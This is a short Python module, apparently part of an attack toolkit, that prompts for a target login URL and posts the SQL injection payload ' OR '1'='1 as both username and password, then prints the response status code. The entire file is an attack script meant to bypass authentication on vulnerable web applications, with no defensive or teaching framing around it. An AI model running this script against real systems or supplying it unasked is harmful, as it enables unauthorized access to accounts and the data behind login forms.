# sql_injection/sql_attacker.py
import requests

def run_sql_attacker():
    print("\n=== SQL Injection ===")
    url = input("Enter target URL (e.g., http://example.com/login): ")
    payload = "' OR '1'='1"
    data = {"username": payload, "password": payload}
    response = requests.post(url, data=data)
    print(f"Response status code: {response.status_code}")
